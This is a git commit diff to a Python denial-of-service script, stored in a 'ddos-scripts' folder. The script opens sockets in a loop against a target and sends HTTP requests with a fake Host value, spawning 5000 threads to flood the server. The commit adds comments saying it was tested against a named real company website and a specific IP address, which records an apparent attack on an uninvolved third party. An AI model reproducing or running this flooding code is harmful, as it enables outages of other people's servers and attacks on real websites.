b4c8cf5cd719f77e68502e5486afd2f47e052293
natemvm-py <84882038+natemvm-py@users.noreply.github.com>
2021-06-03 06:43:12 +1200

    Update simple socket ddos.py

--- python/ddos-scripts/simple socket ddos.py
+++ python/ddos-scripts/simple socket ddos.py
@@ -1,4 +1,6 @@
 # https://www.neuralnine.com/code-a-ddos-script-in-python/
+# TESTED ON WWW.SUPACRETE.CO.NZ PORT: 80
+# OR 49.50.246.83:80
 
 import socket
 import threading
@@ -15,11 +17,9 @@ def attack():
         s.connect((target, port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        """
         global attack_num
         attack_num += 1
         print("Packets Sent: ", attack_num)
-        """
         s.close()
         
 for i in range(5000):
